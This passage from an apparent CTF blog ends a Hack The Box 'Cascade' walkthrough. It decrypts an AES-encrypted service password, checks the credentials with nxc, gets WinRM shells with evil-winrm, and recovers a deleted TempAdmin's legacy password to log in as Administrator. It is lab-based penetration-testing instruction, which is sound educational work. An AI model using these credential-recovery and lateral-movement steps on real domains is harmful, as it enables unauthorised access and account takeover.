VALUES(1,&#x27;ArkSvc&#x27;,&#x27;&lt;BASE64&gt;&#x27;,&#x27;cascade.local&#x27;);</span><br><span class="line">CREATE TABLE IF NOT EXISTS &quot;Misc&quot; (</span><br><span class="line">	&quot;Id&quot;	INTEGER PRIMARY KEY AUTOINCREMENT,</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>
<p>So we have a hash for the user <code>ArkSvc</code>. Next we look at the <code>dll</code> we got back in <code>dnSpy</code>.<br><img src="/img/cipherCBC.png"><br>We have the function <code>Crypto</code> and looking it over we see were using AES. Doing some research and looking at <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.ciphermode?view=netcore-3.1">cipher mode CBC</a> as mention in the <code>dll</code> code (<code>aes.Mode = CipherMode.CBC;</code>),we first we need to install <code>pyaes</code> (<em>apt install python-pyaes</em>). Then use python to decrypt the password we have from the sqlite database. </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ python3</span><br><span class="line">Python 3.11.2 (main, Nov 30 2024, 21:22:50) [GCC 12.2.0] on linux</span><br><span class="line">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span><br><span class="line">&gt;&gt;&gt; import pyaes</span><br><span class="line">&gt;&gt;&gt; from base64 import b64decode</span><br><span class="line">&gt;&gt;&gt; key = b&#x27;KEY&#x27;</span><br><span class="line">&gt;&gt;&gt; iv = b&#x27;IV&#x27;</span><br><span class="line">&gt;&gt;&gt; aes = pyaes.AESModeOfOperationCBC(key, iv = iv)</span><br><span class="line">&gt;&gt;&gt; decrypted = aes.decrypt(b64decode(&#x27;&lt;BASE64&gt;&#x27;))</span><br><span class="line">&gt;&gt;&gt; print(decrypted.decode())</span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
<p>We got the password for <code>arksvc</code>. We can check our access with <code>nxc</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ nxc winrm 10.10.10.182 -u arksvc -p &lt;SNIP&gt;</span><br><span class="line">WINRM       10.10.10.182    5985   CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 (name:CASC-DC1) (domain:cascade.local)</span><br><span class="line">WINRM       10.10.10.182    5985   CASC-DC1         [+] cascade.local\arksvc:&lt;SNIP&gt; (Pwn3d!)</span><br></pre></td></tr></table></figure>
<p>Lets get access and snoop around. </p>
<h2 id="Shell-as-arksvc"><a href="#Shell-as-arksvc" class="headerlink" title="Shell as arksvc"></a>Shell as arksvc</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ evil-winrm -i 10.10.10.182 -u arksvc -p &lt;SNIP&gt;</span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\arksvc\Documents&gt; whoami /groups</span><br><span class="line"></span><br><span class="line">GROUP INFORMATION</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">Group Name                                  Type             SID                                            Attributes</span><br><span class="line">=========================================== ================ ============================================== ===============================================================</span><br><span class="line">Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group</span><br><span class="line">CASCADE\Data Share                          Alias            S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group</span><br><span class="line">CASCADE\IT                                  Alias            S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local Group</span><br><span class="line">CASCADE\AD Recycle Bin                      Alias            S-1-5-21-3332504370-1206983947-1165150453-1119 Mandatory group, Enabled by default, Enabled group, Local Group</span><br><span class="line">CASCADE\Remote Management Users             Alias            S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local Group</span><br><span class="line">NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group</span><br></pre></td></tr></table></figure>
<p><img src="/img/recycle.gif"></p>
<p>We see were in the <code>AD Recycle Bin Group</code>, and looking online we find a <a target="_blank" rel="noopener" href="https://github.com/ivanversluis/pentest-hacktricks/blob/master/windows/active-directory-methodology/privileged-accounts-and-token-privileges.md">github</a> stating that the Group has the permissions to read deleted AD objects. We can try to see if there is anything that has been deleted.</p>
<h2 id="PrivEsc"><a href="#PrivEsc" class="headerlink" title="PrivEsc"></a>PrivEsc</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\arksvc\Documents&gt; Get-ADObject -filter &#x27;isDeleted -eq $true&#x27; -includeDeletedObjects -Properties *</span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">accountExpires                  : 9223372036854775807</span><br><span class="line">badPasswordTime                 : 0</span><br><span class="line">badPwdCount                     : 0</span><br><span class="line">CanonicalName                   : cascade.local/Deleted Objects/TempAdmin</span><br><span class="line">                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059</span><br><span class="line">cascadeLegacyPwd                : &lt;BASE64&gt;</span><br><span class="line">CN                              : TempAdmin</span><br><span class="line">                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059</span><br><span class="line">codePage                        : 0</span><br><span class="line">countryCode                     : 0</span><br><span class="line">Created                         : 1/27/2020 3:23:08 AM</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>
<p>We happen to have another <code>cascadeLegacyPwd</code> we can decode.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ echo &lt;BASE64&gt;| base64 -d</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>


<p>Seeing as this was for the <code>TempAdmin</code>, we can try <code>Administrator</code> with this password.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ evil-winrm -i 10.10.10.182 -u Administrator -p &lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v3.5</span><br><span class="line"></span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine</span><br><span class="line"></span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami;hostname</span><br><span class="line">cascade\administrator</span><br><span class="line">CASC-DC1</span><br></pre></td></tr></table></figure>
<p><img src="/img/robocop.gif"></p>
</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/SMB/">SMB</a><a class="post-meta__tags" href="/tags/LDAP/">LDAP</a><a class="post-meta__tags" href="/tags/Registry/">Registry</a><a class="post-meta__tags" href="/tags/NET/">.NET</a><a class="post-meta__tags" href="/tags/Source-Code-Analysis/">Source Code Analysis</a><a class="post-meta__tags" href="/tags/AD-Recycle-Bin-Group/">AD Recycle Bin Group</a></div><div class="post-share"><div class="social-share" data-image="/img/cascade.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/03/14/Cypher/" title="Cypher (Linux Medium)"><img class="cover" src="/img/cypher.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">Cypher (Linux Medium)</div></div><div class="info-2"><div class="info-item-1">Cypher is a Linux Medium box that starts with a website hosting a .jar file. Once downloaded and decompiled you find amongst them a CustomFunctions.class java file. Using jd-gui we are able to look at the source code of the file. The code reveals a attack vector inside a string that executes a system command. Using Cypher Injection we are able to obtain a reverse shell that gets us on the box as neo4j. Once on the box we look around to find a .yml file containing credentials. Trying with the other user gets us a shell as graphasm. We ssh in for stability, and check what permissions we have with sudo -l that reveals we can run bbot with sudo. Looking into the github and the man pages. We can force run a config through a dry run and have it abort before executing. Doing this we can obtain the root.txt file.  Initial Nmap12345678910111213PORT   STATE SERVICE REASON         VERSION22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)|...</div></div></div></a><a class="pagination-related" href="/2025/02/24/blackfield/" title="Blackfield (Windows Hard)"><img class="cover" src="/img/blackfield.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Blackfield (Windows Hard)</div></div><div class="info-2"><div class="info-item-1">Backfield is a hard Windows machine featuring Windows and Active Directory misconfigurations. Anonymous &#x2F; Guest access to an SMB share is used to enumerate users. The user is found to have Kerberos pre-authentication disabled, which allows us to conduct an ASREPRoasting attack. This allows us to retrieve a hash of the encrypted material contained in the AS-REP, which can be subjected to an offline brute force attack in order to recover the plaintext password. With this user we can access a SMB share containing forensics artifacts, including an lsass process dump. This contains a username and a password for a user with WinRM privileges, who is also a member of the Backup Operators group. The privileges conferred by this privileged group are used to dump the Active Directory database, and retrieve the hash of the primary domain administrator.  Nmap1234567891011121314PORT      STATE SERVICE       REASON          VERSION53/tcp    open  domain        syn-ack ttl 127 Simple DNS...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/hacking-crook.gif" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Jay</div><div class="author-info-description">An aspiring hacker and a CTF player</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">35</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">3</div></a></div><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/itzgottabejay" target="_blank" title="Github"><i class="fab fa-github" style="color: #E2E6E6;"></i></a><a class="social-icon" href="https://www.linkedin.com/in/ianberdahl/" target="_blank" title="LinkedIn"><i class="fab fa-linkedin" style="color: #007aff;"></i></a><a class="social-icon" href="https://app.hackthebox.com/profile/420575" target="_blank" title="HackTheBox"><i class="fa-solid fa-cube" style="color: #2dfc04;"></i></a><a class="social-icon" href="https://www.instagram.com/junkie_mayhem/" target="_blank" title="Instagram"><i class="fab fa-instagram" style="color: #833AB4;"></i></a><a class="social-icon" href="https://x.com/deadcyberninja" target="_blank" title="X"><i class="fab fa-x-twitter" style="color: #000404;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">I like to put things here for safe keeping 🔐🔐</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Nmap"><span class="toc-number">1.</span> <span class="toc-text">Initial Nmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LDAP"><span class="toc-number">2.</span> <span class="toc-text">LDAP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SMB"><span class="toc-number">3.</span> <span class="toc-text">SMB</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#VNC-Registry-File"><span class="toc-number">4.</span> <span class="toc-text">VNC Registry File</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Password-Spraying"><span class="toc-number">5.</span> <span class="toc-text">Password Spraying</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SMasHing-SMB-with-s-smith"><span class="toc-number">6.</span> <span class="toc-text">SMasHing SMB with s.smith</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Source-Code-Analysis"><span class="toc-number">7.</span> <span class="toc-text">Source Code Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell-as-arksvc"><span class="toc-number">8.</span> <span class="toc-text">Shell as arksvc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PrivEsc"><span class="toc-number">9.</span> <span class="toc-text">PrivEsc</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url(/img/n8.jpg);"><div id="footer-wrap"></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="IM,WATCHING,YOU" data-fontsize="21px" data-random="false" async="async"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Where do you want to go?" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>